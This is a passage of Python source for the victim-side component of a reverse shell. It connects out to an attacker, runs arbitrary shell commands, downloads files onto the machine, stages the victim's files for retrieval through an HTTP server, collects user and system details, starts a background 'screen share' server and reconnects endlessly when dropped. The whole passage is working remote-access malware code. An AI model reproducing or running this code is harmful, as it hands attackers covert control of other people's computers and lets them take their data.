                                        # progress = int(100 * bytes_downloaded / total_size) if total_size else 0
                                        # print(f"Downloading {file_name}: {progress}%")

                            print(f"[RevShell] Downloaded {bytes_downloaded} bytes to temp file: {temp_path}")

                            # Download finished, move temp file to final destination using FileLock
                            try:
                                print(f"[RevShell] Attempting to lock and rename to: {final_path}")
                                with FileLock(final_path): # Lock the final destination path
                                    if os.path.exists(final_path):
                                        os.remove(final_path) # Remove existing file if present
                                    shutil.move(temp_path, final_path) # Move temp file
                                print(f"[RevShell] File rename successful: {final_path}")
                                output += f"File downloaded successfully: {final_path}\n"
                            except (TimeoutError, OSError, Exception) as lock_e:
                                 print(f"[RevShell] Error locking/renaming file: {lock_e}")
                                 output += f"Error saving file (lock/rename failed): {lock_e}\n"
                                 # Try to remove temp file if rename failed
                                 if os.path.exists(temp_path):
                                      try: os.remove(temp_path)
                                      except Exception as del_e: print(f"Error removing temp file {temp_path}: {del_e}")


                        except requests.exceptions.RequestException as req_e:
                            print(f"[RevShell] Download failed: {req_e}")
                            output += f"Download failed: {req_e}\n"
                            if os.path.exists(temp_path):
                                try: os.remove(temp_path)
                                except Exception as del_e: print(f"Error removing temp file {temp_path}: {del_e}")
                        except Exception as e:
                            print(f"[RevShell] Error during download: {e}")
                            output += f"Error during download: {e}\n"
                            if os.path.exists(temp_path):
                                try: os.remove(temp_path)
                                except Exception as del_e: print(f"Error removing temp file {temp_path}: {del_e}")


                elif command == ("connection_history"):
                    try:
                        conn_hist = get_db_connection()
                        if conn_hist:
                            cursor = conn_hist.cursor()
                            cursor.execute("SELECT id, timestamp, target_ip, success, error_message FROM connection_history ORDER BY timestamp DESC LIMIT 20")
                            rows = cursor.fetchall()
                            conn_hist.close()

                            if rows:
                                output = "Reverse Shell Connection History (Last 20 attempts):\n"
                                output += "ID | Timestamp           | Target IP     | Status | Error\n"
                                output += "---|---------------------|---------------|--------|------\n"
                                for row in rows:
                                    status = 'Success' if row[3] else 'Failed'
                                    error_msg = row[4][:30] + '...' if len(row[4]) > 30 else row[4] # Truncate error
                                    output += f"{row[0]:<2d} | {row[1]:<19s} | {row[2]:<13s} | {status:<6s} | {error_msg}\n"
                            else:
                                output = "No reverse shell connection history found.\n"
                        else:
                             output = "Error: Could not connect to history database.\n"
                    except Exception as e:
                        output = f"Error retrieving connection history: {str(e)}\n"

                elif command.startswith("upload "): # Victim uploads *to* its own HTTP server
                    # This seems less useful for reverse shell, more for attacker getting files? Keep for now.
                    try:
                        file_path = command[len("upload "):].strip()
                        # Handle potential quotes
                        if len(file_path) > 1 and file_path.startswith('"') and file_path.endswith('"'):
                             file_path = file_path[1:-1]

                        if os.path.exists(file_path) and os.path.isfile(file_path):
                            # Destination is the CWD of the HTTP server (VictimTest)
                            http_server_cwd = os.getcwd() # Assumes CWD is VictimTest
                            file_name = os.path.basename(file_path)
                            destination_path = os.path.join(http_server_cwd, file_name)

                            # Use file lock during copy to prevent conflicts with HTTP server reading
                            try:
                                with FileLock(destination_path):
                                    # Check if file exists at destination after acquiring lock
                                    if os.path.exists(destination_path):
                                        # Overwrite existing file? Or rename? Overwrite for simplicity here.
                                        # print(f"Overwriting existing file at: {destination_path}")
                                        pass # Overwrite happens implicitly with copy2
                                    shutil.copy2(file_path, destination_path) # copy2 preserves metadata
                                output = f"File copied for upload: {file_name} ready at HTTP server root.\n"
                            except (TimeoutError, OSError, Exception) as lock_e:
                                 output = f"Error locking/copying file for upload: {lock_e}\n"
                        elif not os.path.exists(file_path):
                            output = f"Error: Source file not found: {file_path}\n"
                        else: # Exists but is not a file
                             output = f"Error: Source path is not a file: {file_path}\n"
                    except Exception as e:
                        output = f"Error processing upload command: {str(e)}\n"

                elif command == "whoami" or command == "Whoami": # Keep original command name
                    try:
                        # Use shell=True for safety, but capture output
                        result = subprocess.run("whoami", shell=True, capture_output=True, text=True, errors='ignore', timeout=5)
                        if result.returncode == 0:
                            username = result.stdout.strip()
                             # Optional: Extract just the username part if domain included
                            if "\\" in username: 
                                username = username.split("\\")[-1]
                        else:
                             username = f"Error ({result.returncode}): {result.stderr.strip()}"


                        # Get system information
                        system_info = "System Info:\n"
                        try: system_info += f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                        except: system_info += "OS: Error retrieving\n"
                        try: system_info += f"Arch: {platform.architecture()[0]}\n"
                        except: system_info += "Arch: Error retrieving\n"
                        try: system_info += f"Machine: {platform.machine()}\n"
                        except: system_info += "Machine: Error retrieving\n"
                        try: system_info += f"Processor: {platform.processor()}\n"
                        except: system_info += "Processor: Error retrieving\n"
                        try: system_info += f"Hostname: {platform.node()}\n"
                        except: system_info += "Hostname: Error retrieving\n"

                        # Get current working directory
                        cwd = os.getcwd()

                        # Combine all information
                        output = f"Username: {username}\n{system_info}Current Directory: {cwd}\n"
                    except Exception as e:
                        output = f"Error getting system info: {str(e)}\n"


                else:
                    # --- Execute general command ---
                    try:
                        # Run command in the current directory context
                        # Use shell=True carefully, it can be a security risk if attacker controls the command string fully
                        result = subprocess.run(command, shell=True, capture_output=True,
                                                text=True, errors='ignore', cwd=current_directory, timeout=60) # Added timeout
                        output = result.stdout + result.stderr
                        if not output.strip(): # Check if output is just whitespace
                            output = f"[+] Command '{command}' executed successfully (no output)\n"
                        # Ensure output ends with newline for cleaner display on attacker side
                        if not output.endswith('\n'):
                            output += '\n'

                    except subprocess.TimeoutExpired:
                        output = f"Error: Command '{command}' timed out after 60 seconds.\n"
                    except Exception as e:
                        output = f"Error executing command '{command}': {str(e)}\n"

                # --- Send the output (and next prompt) back to the attacker ---
                try:
                    # Combine output and next prompt
                    full_response = output + f"{current_directory}> "
                    s.sendall(full_response.encode(errors='ignore')) # Ignore encoding errors for weird output
                except socket.error as send_err:
                    print(f"[RevShell] Socket error sending output: {send_err}. Closing connection.")
                    break # Assume connection is dead
                except Exception as send_err:
                     print(f"[RevShell] Error sending output: {send_err}. Closing connection.")
                     break # Assume connection is dead


            except ConnectionResetError:
                print("[RevShell] Connection reset by attacker.")
                break
            except socket.error as sock_err:
                 print(f"[RevShell] Socket error during command loop: {sock_err}")
                 break
            except Exception as e:
                # Handle any exceptions that occur during command processing
                print(f"[RevShell] Error processing command: {e}")
                try:
                    # Try to send the error back to the attacker
                    error_msg = f"Error on victim side: {e}\n{current_directory}> "
                    s.sendall(error_msg.encode(errors='ignore'))
                except:
                    # If sending error fails, connection is likely dead
                    print("[RevShell] Could not send error to attacker. Closing connection.")
                    break

    except Exception as e:
        # Errors outside the main command loop (e.g., initial prompt send failed - handled above now)
        print(f"[RevShell] Unhandled connection error: {str(e)}")
    finally:
        # Cleanup: Close the socket if it exists and is valid
        if s and s.fileno() != -1:
            try:
                s.close()
                print("[RevShell] Socket closed.")
            except Exception as close_e:
                 print(f"[RevShell] Error closing socket: {close_e}")


# --- Main Execution Logic ---
if __name__ == "__main__":
    # Start the combined Screen Share Command Server & HTTP File Server in a background thread
    server_thread = threading.Thread(target=start_combined_server, daemon=True)
    server_thread.start()

    # Main loop for the reverse shell connection
    while True:
        print("[RevShell] Attempting to establish reverse shell connection...")
        rev_shell_socket = None # Ensure variable exists
        try:
            # Connect to the attacker for the reverse shell
            rev_shell_socket = connect_to_attacker() # This now returns a valid, open socket on success

            # Handle the connection (blocking call)
            if rev_shell_socket:
                 handle_connection(rev_shell_socket) # Pass the valid socket
            else:
                 # connect_to_attacker failed to return a socket (shouldn't happen with its loop unless fatal error)
                 print("[RevShell] connect_to_attacker returned None. Retrying after delay.")
                 time.sleep(10) # Wait before retrying the main loop

            # If handle_connection finishes (e.g., exit command, connection lost), the loop will restart connection attempt
            print("[RevShell] Connection cycle finished. Restarting connection attempt...")
            # Brief delay before reconnecting immediately after intentional exit/disconnect
            time.sleep(random.uniform(2.0, 5.0))

        except Exception as main_loop_e:
             print(f"[RevShell][CRITICAL] Error in main reverse shell loop: {main_loop_e}")
             # Close socket if it exists from this scope and is valid
             if rev_shell_socket and rev_shell_socket.fileno() != -1:
                  try: rev_shell_socket.close()
                  except: pass
             print("[RevShell] Retrying main loop after error...")
             time.sleep(10) # Wait longer after a critical error